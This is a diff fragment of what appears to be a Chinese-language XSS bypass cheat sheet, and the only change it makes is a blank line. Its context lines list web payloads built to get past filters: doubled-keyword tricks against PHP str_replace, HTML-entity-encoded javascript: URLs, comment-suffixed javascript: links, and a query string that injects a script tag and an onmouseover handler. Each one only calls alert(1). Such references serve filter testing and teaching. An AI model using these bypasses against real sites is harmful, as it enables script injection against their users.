@@ -44,6 +44,7 @@ php str_replace()   双写绕过  ```<a hhrefref=javasscriptcript:alert(1)>test<
 Unicode编码转换  ```javasc&#114;ipt:alert('1')```  (不可转换标签属性)
 
 ```javascript:alert(1)/*http://www*/```     加上注释是为了不影响执行
+
 ```javascript:alert(1)//http://www*/```     加上注释是为了不影响执行
 
 ```keyword=<script>alert(1)</script>&t_sort="onmouseover="alert(1)"type="txt"```
